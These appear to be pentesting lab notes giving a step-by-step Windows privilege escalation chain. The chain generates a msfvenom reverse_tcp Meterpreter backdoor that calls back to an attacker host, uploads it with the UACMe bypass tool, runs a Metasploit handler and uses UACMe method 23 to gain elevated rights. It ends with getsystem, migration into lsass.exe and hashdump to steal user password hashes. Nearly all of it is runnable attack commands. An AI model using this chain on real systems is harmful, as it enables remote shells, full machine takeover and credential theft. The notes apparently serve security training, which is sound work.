Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has 65+ methods that can be used by the user to bypass UAC depending on the
Windows OS version.

- Written majorly in C, with some code in C++.

Generating malicious executable using msfvenom and running it on the target machine
to gain administrator user privileges.
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=<HOST_IP>LPORT=4444 -f exe > 'backdoor.exe'

The UACMe tool located in "/root/Desktop/tools/UACME/" directory
Switch the directory to the userâ€™s temp folder and upload the Akagi64.exe and
backdoor.exe executable.
-CTRL + C
-cd C:\\Users\\admin\\AppData\\Local\\Temp
-upload /root/Desktop/tools/UACME/Akagi64.exe .
-upload /root/backdoor.exe .
-ls
Now we will start another msfconsole to run a multi handler
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <host_ip>
-set LPORT 4444
-exploit

Go back to the meterpreter shell. Run the following commands
- shell
Now we will provide the full path to the exec
-Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

We are going to use UACMe method number 23:
Author: Leo Davidson derivative
Type: Dll Hijack
Method: IFileOperation
Target(s): \system32\pkgmgr.exe
Component(s): DismCore.dll
Implementation: ucmDismMethod

then we will run the following command to escalate priv
-getsystem
Migrate in lsass.exe process to dump user hashes
-ps -S lsass.exe
-migrate <PID>
Then we will dump the hashes
-hashdump
